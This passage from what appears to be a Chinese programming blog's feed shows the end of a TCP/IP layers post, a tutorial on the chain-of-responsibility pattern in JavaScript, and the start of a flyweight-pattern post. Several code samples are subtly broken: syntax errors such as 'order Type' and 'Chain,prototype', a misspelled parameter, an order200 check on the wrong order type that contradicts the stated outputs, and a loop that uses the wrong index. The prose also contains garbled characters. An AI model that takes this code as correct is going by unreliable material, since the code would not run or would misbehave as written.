头部，并封装成数据帧（Data frame）发送到网络上。</p><p>以太网在判断网络包目的地时和 IP 的方式不同，因此必须采用相匹配的方式才能在以太网中将包发往目的地，而 MAC 头部就是干这个用的，所以，在以太网进行通讯要用到 MAC 地址。</p><p>MAC 头部是以太网使用的头部，它包含了接收方和发送方的 MAC 地址等信息，我们可以通过 ARP 协议获取对方的 MAC 地址。</p><p>所以说，网络接口层主要为网络层提供「链路级别」传输的服务，负责在以太网、WiFi 这样的底层网络上发送原始数据包，工作在网卡这个层次，使用 MAC 地址来标识网络上的设备。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>综上所述，TCP&#x2F;IP 网络通常是由上到下分成 4 层，分别是<strong>应用层，传输层，网络层和网络接口层</strong>。</p><p><img src="https://cdn.xiaolincoding.com/gh/xiaolincoder/ImageHost3@main/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%B5%AE%E7%82%B9/%E5%B0%81%E8%A3%85.png" alt="img"></p><p>网络接口层的传输单位是帧（frame），IP 层的传输单位是包（packet），TCP 层的传输单位是段（segment），HTTP 的传输单位则是消息或报文（message）。但这些名词并没有什么本质的区分，可以统称为数据包。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;在我第一次接触计网东西的时候是前端的浏览器页面右击检查，点开Network，发现里面的东西都不大了解，甚至看不懂这些是什么，但我知道这是和后端交互，给后端发送请求，学习计网时我的基础也只有2xx、3xx、4xx、5xx这些状态码的含义。其他一概不知。学习计网的第一天也是我实</summary>
      
    
    
    
    <category term="计算机网络" scheme="http://cychenhaibin.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"/>
    
    
    <category term="计算机网络" scheme="http://cychenhaibin.github.io/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"/>
    
  </entry>
  
  <entry>
    <title>职责链模式</title>
    <link href="http://cychenhaibin.github.io/2024/10/07/%E8%81%8C%E8%B4%A3%E9%93%BE%E6%A8%A1%E5%BC%8F/"/>
    <id>http://cychenhaibin.github.io/2024/10/07/%E8%81%8C%E8%B4%A3%E9%93%BE%E6%A8%A1%E5%BC%8F/</id>
    <published>2024-10-07T09:21:47.000Z</published>
    <updated>2024-10-07T10:43:18.000Z</updated>
    
    <content type="html"><![CDATA[<p>职责链的定义是：使多个对象都有机会处理请求，从而避免请求的发送者和接收者之间的耦合关系，将这些对象连成一条链，并沿着这条链传递该请求，直到有一个对象处理它为止。</p><p>职责链模式的名字非常形象，一系列可能会处理请求的对象被连接成一条链，请求在这些对象之间传递，直到遇到一个可以处理它的对象，我们把这些对象称为链中的节点。</p><h3 id="一、现实中的职责链模式"><a href="#一、现实中的职责链模式" class="headerlink" title="一、现实中的职责链模式"></a>一、现实中的职责链模式</h3><p>职责链的模式在现实中并不难找到，以下就是两个常见的跟职责链模式有关的场景：</p><ul><li>如果早高峰能顺利挤上公交车的话，那么估计这一天都会过的很开心。因为公交车上人实在太多了，经常上车后却找不到售票员在哪，所以只好把两块钱硬币往前面递。除非你运气够好，站在你前面的第一个人就是售票员，否则，你的硬币通常要在N个人手上传递，才能最终到达售票员的手里。</li><li>中学时代的期末考试，如果你平时不太老实，考试时就会被安排在第一个位置。遇到不会答的题目，就把题目编号写在小纸条上往后传递，坐在后面的同学如果也不会答，他就会把这张小纸条继续递给他后面的人。</li></ul><p>从这两个例子中，我们很容易找到职责链模式的最大优点：请求发送者只需要知道链中第一个节点，从而弱化了发送者和一组接收者之间的强联系。如果不使用职责链模式，那么在公车上，我就得先搞清楚谁是售票员，才能把硬币遂给他。同样，在期末考试中，也许我就要先了解同学中有哪些可以解答这道题。</p><h3 id="二、实际开发中的职责链模式"><a href="#二、实际开发中的职责链模式" class="headerlink" title="二、实际开发中的职责链模式"></a>二、实际开发中的职责链模式</h3><p>假设我们负责一个售卖手机的电商网站，经过分别交纳500元定金和200元定金的两轮预定后(订单已在此时生成)，现在已经到了正式购买的阶段。</p><p>公司针对支付过定金的用户有一定的优惠政策。在正式购买后，已经支付过500元定金的用户会收到100元的商城优惠券，200元定金的用户可以收到50元的优惠券，而之前没有支付定金的用户只能进入普通购买模式，也就是没有优惠券，且在库存有限的情况下不一定保证能买到。</p><p>我们的订单页面是PIP吐出的模板，在页面加载之初，PTIP会传递给页面几个字段。</p><ul><li>orderType：表示订单类型(定金用户或者普通购买用户)code的值为1的时候是500元定金用户，为2的时候是200元定金用户，为3的时候是普通购买用户。</li><li>pay：表示用户是否已经支付定金，值为true或者false，虽然用户已经下过500元定金的订单，但如果他一直没有支付定金，现在只能降级进入普通购买模式。</li><li>stock：表示当前用于普通购买的手机库存数量，已经支付过500元或者200元定金的用户不受此限制。</li></ul><p>下面我们把这个流程写成代码：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> order = <span class="keyword">function</span>(<span class="params">orderType, pay, stock</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span>(order <span class="title class_">Type</span> === <span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(pay === <span class="literal">true</span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;500元定金预购，得到100优惠券&#x27;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(stock &gt; <span class="number">0</span>)&#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;普通购买，无优惠券&#x27;</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;手机库存不足&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(order <span class="title class_">Type</span> === <span class="number">2</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(pay === <span class="literal">true</span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;200元定金预购，得到50优惠券&#x27;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(stock &gt; <span class="number">0</span>)&#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;普通购买，无优惠券&#x27;</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;手机库存不足&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(order <span class="title class_">Type</span> === <span class="number">3</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(stock &gt; <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;普通购买，无优惠券&#x27;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;手机库存不足&#x27;</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>虽然我们得到了意料中的运行结果，但这远远算不上一段值得夸奖的代码。order函数不仅巨大到难以阅读，而且需要经常进行修改。虽然目前项目能正常运行，但接下来的维护工作无疑是个梦麗。恐怕只有最“新手”的程序员才会写出这样的代码。</p><h3 id="三、用职责链模式重构代码"><a href="#三、用职责链模式重构代码" class="headerlink" title="三、用职责链模式重构代码"></a>三、用职责链模式重构代码</h3><p>现在我们采用职责链模式重构这段代码，先把500元订单、200元订单以及普通购买分成3个函数。</p><p>接下来把orderType、pay、stock这3个字段当作参数传递给500元订单两数，如果该函数不符合处理条件，则把这个请求传递给后面的200元订单函数，如果200元订单函数依然不能处理该请求，则继续传递请求给普通购买函数，代码如下：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 500订单</span></span><br><span class="line"><span class="keyword">var</span> order500 = <span class="keyword">function</span>(<span class="params">orderType, pay, stock</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(orderType === <span class="number">1</span> &amp;&amp; pay === <span class="literal">true</span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;500元定金预购，得到100优惠券&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_">order200</span>(orderType, pay, stock);  <span class="comment">// 将请求传递给200元订单</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 200元订单</span></span><br><span class="line"><span class="keyword">var</span> order200 = <span class="keyword">function</span>(<span class="params">orderType, pay, stock</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(orderType === <span class="number">1</span> &amp;&amp; pay === <span class="literal">true</span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;200元定金预购，得到50优惠券&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_">orderNormal</span>(orderType, pay, stock);  <span class="comment">// 将请求传递给普通订单</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 普通购买订单</span></span><br><span class="line"><span class="keyword">var</span> orderNormal = <span class="keyword">function</span>(<span class="params">orderType, pay, stock</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(stock &gt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;普通购买，无优惠券&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;手机库存不足&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>可以看到，执行结果和前面那个巨大的order函数完全一样，但是代码的结构已经清晰了很多，我们把一个大函数拆分了3个小函数，去掉了许多嵌套的条件分支语句。</p><p>目前已经有了不小的进步，但我们不会满足于此，虽然已经把大函数拆分成了互不影响的3个小函数，但可以看到，请求在链条传递中的顺序非常僵硬，传递请求的代码被耦合在了业务函数之中:</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> order500 = <span class="keyword">function</span>(<span class="params">orderType, pay, stock</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(orderType === <span class="number">1</span> &amp;&amp; pay === <span class="literal">true</span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;500元定金预购，得到100优惠券&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_">order200</span>(orderType, pay, stock);  <span class="comment">// order500 和 order200 耦合在一起</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这依然是违反开放-封闭原则的，如果有天我们要增加300元预订或者去掉200元预订，意味着就必须改动这些业务函数内部。就像一根环环相扣打了死结的链条，如果要增加、拆除或者移动一个节点，就必须得先砸烂这根链条。</p><h3 id="四、灵活拆分职责链节点"><a href="#四、灵活拆分职责链节点" class="headerlink" title="四、灵活拆分职责链节点"></a>四、灵活拆分职责链节点</h3><p>我们采用一种更灵活的方式，来改进上面的职责链模式，目标是让链中的各个节点可以灵活拆分和重组。</p><p>首先需要改写一下分别表示3种购买模式的节点函数，我们约定，如果某个节点不能处理请求，则返回一个特定的字符串 ‘nextSuccessor’来表示该请求需要继续往后面传递：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 500订单</span></span><br><span class="line"><span class="keyword">var</span> order500 = <span class="keyword">function</span>(<span class="params">orderType, pay, stock</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(orderType === <span class="number">1</span> &amp;&amp; pay === <span class="literal">true</span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;500元定金预购，得到100优惠券&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;nextSuccessor&#x27;</span>;    <span class="comment">// 我不知道下一个节点是谁，反正把请求往后传递</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 200元订单</span></span><br><span class="line"><span class="keyword">var</span> order200 = <span class="keyword">function</span>(<span class="params">orderType, pay, stock</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(orderType === <span class="number">1</span> &amp;&amp; pay === <span class="literal">true</span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;200元定金预购，得到50优惠券&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;nextSuccessor&#x27;</span>;    <span class="comment">// 我不知道下一个节点是谁，反正把请求往后传递</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 普通购买订单</span></span><br><span class="line"><span class="keyword">var</span> orderNormal = <span class="keyword">function</span>(<span class="params">orderType, pay, stock</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(stock &gt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;普通购买，无优惠券&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;手机库存不足&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>接下来需要把丽数包装进职责链节点，我们定义一个构造的数 Chain，在new Chain 的时候传递的参数即为需要被包装的丽数，同时它还拥有一个实例属性this.successor，表示在链中的下一个节点。</p><p>此外Chain的prototype中还有两个函数，它们的作用如下所示:</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Chain,prototype.setNextSuccessor 指定在链中的下一个节点</span></span><br><span class="line"><span class="comment">// Chain,prototype.passRequest      传递请求给某个节点</span></span><br><span class="line"><span class="keyword">var</span> <span class="title class_">Chain</span> = <span class="keyword">function</span>(<span class="params">fn</span>)&#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">fn</span> = fn;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">successor</span> = <span class="literal">null</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Chain</span>,prototype.<span class="property">setNextSuccessor</span> = <span class="keyword">function</span>(<span class="params">sucessor</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">successor</span> = successor;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Chain</span>,prototype.<span class="property">passRequest</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> ret = <span class="variable language_">this</span>.<span class="property">fn</span>.<span class="title function_">apply</span>(<span class="variable language_">this</span>, <span class="variable language_">arguments</span>);</span><br><span class="line">    <span class="keyword">if</span>(ret === <span class="string">&#x27;nextSuccessor&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">successor</span> &amp;&amp; <span class="variable language_">this</span>.<span class="property">successor</span>.<span class="property">passRequest</span>.<span class="title function_">apply</span>(<span class="variable language_">this</span>.<span class="property">successor</span>, <span class="variable language_">arguments</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>现在把3个订单函数分别包装成职责链的节点：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> chainOrder500 = <span class="keyword">new</span> <span class="title class_">Chain</span>(order500);</span><br><span class="line"><span class="keyword">var</span> chainOrder200 = <span class="keyword">new</span> <span class="title class_">Chain</span>(order200);</span><br><span class="line"><span class="keyword">var</span> chainOrderNormal = <span class="keyword">new</span> <span class="title class_">Chain</span>(orderNormal);</span><br></pre></td></tr></table></figure><p>然后指定在职责链中的顺序：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">chainOrder500.<span class="title function_">setNextSuccessor</span>(chainOrder200);</span><br><span class="line">chainOrder200.<span class="title function_">setNextSuccessor</span>(chainOrderNormal);</span><br></pre></td></tr></table></figure><p>最后把请求传递给第一个节点：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">chainOrder500.<span class="title function_">passRequest</span>(<span class="number">1</span>,<span class="literal">true</span>,<span class="number">500</span>);    <span class="comment">// 输出：500元定金预购，得到100优惠券</span></span><br><span class="line">chainOrder500.<span class="title function_">passRequest</span>(<span class="number">2</span>,<span class="literal">true</span>,<span class="number">500</span>);    <span class="comment">// 输出：200元定金预购，得到50优惠券</span></span><br><span class="line">chainOrder500.<span class="title function_">passRequest</span>(<span class="number">3</span>,<span class="literal">true</span>,<span class="number">500</span>);    <span class="comment">// 输出：普通购买，无优惠券</span></span><br><span class="line">chainOrder500.<span class="title function_">passRequest</span>(<span class="number">1</span>,<span class="literal">false</span>,<span class="number">0</span>);     <span class="comment">// 输出：手机库存不足</span></span><br></pre></td></tr></table></figure><p>通过改进，我们可以自由灵活地增加，移除和修改链中地节点顺序，假如某天网站运营人员又想出了支持300元定金购买，那我们就在该链中增加一个节点即可：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> order300 = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="comment">// 具体实现</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> chainOrder300 = <span class="keyword">new</span> <span class="title class_">Chain</span>(order300);</span><br><span class="line">chainOrder500.<span class="title function_">setNextSuccessor</span>(chainOrder300);</span><br><span class="line">chainOrder300.<span class="title function_">setNextSuccessor</span>(chainOrder200);</span><br></pre></td></tr></table></figure><h3 id="五、异步的职责链"><a href="#五、异步的职责链" class="headerlink" title="五、异步的职责链"></a>五、异步的职责链</h3><p>在上一节的职责链模式中，我们让每个节点函数同步返回一个特定的值”nextsuccessor”，来表示是否把请求传递给下一个节点。而在现实开发中，我们经常会遇到一些异步的问题，比如我们要在节点两数中发起一个ajax异步请求，异步请求返回的结果才能决定是否继续在职贵链中passReques。</p><p>这时候让节点函数同步返回mnextsuccessr 经没有意义了，所以要给chain类再增加一个原型方法Chain.prototype.next，表示手动传递请求给职责链中的下一个节点：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Chain</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">next</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">successor</span> &amp;&amp; <span class="variable language_">this</span>.<span class="property">successor</span>.<span class="property">passRequest</span>.<span class="title function_">apply</span>(<span class="variable language_">this</span>.<span class="property">successor</span>, <span class="variable language_">arguments</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>来看一个异步职责链的例子：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> fn1 = <span class="keyword">new</span> <span class="title class_">Chain</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;nextSuccessor&#x27;</span>;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> fn2 = <span class="keyword">new</span> <span class="title class_">Chain</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">2</span>);</span><br><span class="line">    <span class="keyword">var</span> self = <span class="variable language_">this</span>;</span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        self.<span class="title function_">next</span>();</span><br><span class="line">    &#125;, <span class="number">1000</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> fn3 = <span class="keyword">new</span> <span class="title class_">Chain</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">3</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">fn1.<span class="title function_">setNextSuccessor</span>(fn2).<span class="title function_">setNextSuccessor</span>(fn3);</span><br><span class="line">fn1.<span class="title function_">passRequest</span>();</span><br></pre></td></tr></table></figure><p>现在得到了一个特殊的链条，请求在链中的节点里传递，但节点有权限决定什么时候把请求交给下一个节点。可以想象，异步的职责链加上命令模式（把ajax请求封装成命令对象），我们可以很方便地创建一个异步ajax队列库。</p><h3 id="六、小结"><a href="#六、小结" class="headerlink" title="六、小结"></a>六、小结</h3><p>职责链模式可以很好的帮助我们管理代码，降低发起请求的对象和处理请求的对象之间的耦合性。职责链中的节点数量和顺序是可以自由变化的，我们可以在运行时决定链中包含哪些节点。</p><p>无论是作用域链、原型链、还是DOM节点中的事件冒泡，我们都能从中找到职责链模式的影子。职责链模式还可以和组合对象模式结合在一起，用来连接部件和父部件，或者提高组合对象的效率。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;职责链的定义是：使多个对象都有机会处理请求，从而避免请求的发送者和接收者之间的耦合关系，将这些对象连成一条链，并沿着这条链传递该请求，直到有一个对象处理它为止。&lt;/p&gt;
&lt;p&gt;职责链模式的名字非常形象，一系列可能会处理请求的对象被连接成一条链，请求在这些对象之间传递，直到遇</summary>
      
    
    
    
    <category term="JavaScript的设计模式和开发实践" scheme="http://cychenhaibin.github.io/categories/JavaScript%E7%9A%84%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E5%92%8C%E5%BC%80%E5%8F%91%E5%AE%9E%E8%B7%B5/"/>
    
    
    <category term="JavaScript的设计模式和开发实践" scheme="http://cychenhaibin.github.io/tags/JavaScript%E7%9A%84%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E5%92%8C%E5%BC%80%E5%8F%91%E5%AE%9E%E8%B7%B5/"/>
    
  </entry>
  
  <entry>
    <title>享元模式</title>
    <link href="http://cychenhaibin.github.io/2024/09/22/%E4%BA%AB%E5%85%83%E6%A8%A1%E5%BC%8F/"/>
    <id>http://cychenhaibin.github.io/2024/09/22/%E4%BA%AB%E5%85%83%E6%A8%A1%E5%BC%8F/</id>
    <published>2024-09-22T07:51:47.000Z</published>
    <updated>2024-09-22T07:52:10.000Z</updated>
    
    <content type="html"><![CDATA[<p>享元（flyweight）模式是一种用于性能优化的模式，”fly”在这里是苍蝇的意思，意为蝇最级。享元模式的核心是运用共享技术来有效支持大量细粒度对象。</p><p>如果系统中因为创建了大量类似的对象而导致内存占用过高，享元模式就非常有用了。在JavaScript中，浏览器特别是移动端的浏览器分配的内存并不算多，如何节省内存就成了一件非常有意义的事情。</p><h3 id="一、初识享元模式"><a href="#一、初识享元模式" class="headerlink" title="一、初识享元模式"></a>一、初识享元模式</h3><p>假设有个内衣工厂，目前的产品有50种男式内衣和50种女士内衣，为了推销产品，工厂决定生产一些塑料模特来穿上他们的内衣拍成广告照片。正常情况下需要50个男模特和50个女模特，然后让他们每人分别穿上一件内衣来拍照。不使用享元模式的情况下，在程序里也许会这样写：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="title class_">Model</span> = <span class="keyword">function</span>(<span class="params"> sex, underwear</span>)&#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">sex</span> = sex;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">underwear</span> = underwear;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Model</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">takePhoto</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;sex=&#x27;</span> + <span class="variable language_">this</span>.<span class="property">sex</span> + <span class="string">&#x27;underwear=&#x27;</span> + <span class="variable language_">this</span>.<span class="property">underwear</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">1</span>; i &lt;= <span class="number">50</span>; i++)&#123;</span><br><span class="line">    <span class="keyword">var</span> maleModel = <span class="keyword">new</span> <span class="title class_">Model</span>(<span class="string">&#x27;male&#x27;</span>, <span class="string">&#x27;underwear&#x27;</span> + i);</span><br><span class="line">    maleModel.<span class="title function_">takePhoto</span>();</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> j = <span class="number">1</span>; j &lt;= <span class="number">50</span>; j++)&#123;</span><br><span class="line">    <span class="keyword">var</span> maleModel = <span class="keyword">new</span> <span class="title class_">Model</span>(<span class="string">&#x27;female&#x27;</span>, <span class="string">&#x27;underwear&#x27;</span> + i);</span><br><span class="line">    maleModel.<span class="title function_">takePhoto</span>();</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>要得到一张照片，每次都需要传入sex和underwear参数，如上所述，现在一共有50种男内衣和50种女内衣，所以一共会产生100个对象。如果将来生产了10000种内衣，那这个程序可能会因为存在如此多的对象已经提前崩溃。</p><p>下面我们来考虑以下如何优化这个场景。虽然有100种内衣，但很明显并不需要50个男模特和50个女模特。其实男模特和女模特各自有一个就足够了，他们分别穿上不同的内衣来拍照。</p><p>先把underwear参数从构造函数中移除，构造函数只接收sex参数：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="title class_">Model</span> = <span class="keyword">function</span>(<span class="params"> sex </span>)&#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">sex</span> = sex;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Model</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">takePhoto</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;sex=&#x27;</span> + <span class="variable language_">this</span>.<span class="property">sex</span> + <span class="string">&#x27;underwear=&#x27;</span> + <span class="variable language_">this</span>.<span class="property">underwear</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>分别创建一个男模特对象和一个女模特对象：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> maleModel = <span class="keyword">new</span> <span class="title class_">Model</span>(<span class="string">&#x27;male&#x27;</span>),</span><br><span class="line">    femaleModel = <span class="keyword">new</span> <span class="title class_">Model</span>(<span class="string">&#x27;female&#x27;</span>);</span><br></pre></td></tr></table></figure><p>给男模特依次穿上所有的男装，并进行拍照：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">1</span>; i &lt;= <span class="number">50</span>; i++)&#123;</span><br><span class="line">    maleModel.<span class="property">underwear</span> = <span class="string">&#x27;underwear&#x27;</span> + i;</span><br><span class="line">    maleModel.<span class="title function_">takePhoto</span>();</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>给女模特依次穿上所有的女装，并进行拍照：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> j = <span class="number">1</span>; j &lt;= <span class="number">50</span>; j++)&#123;</span><br><span class="line">    femaleModel.<span class="property">underwear</span> = <span class="string">&#x27;underwear&#x27;</span> + i;</span><br><span class="line">    femaleModel.<span class="title function_">takePhoto</span>();</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>可以看到改进之后的代码，只需要两个对象便完成了同样的功能。</p><h3 id="二、内部状态与外部状态"><a href="#二、内部状态与外部状态" class="headerlink" 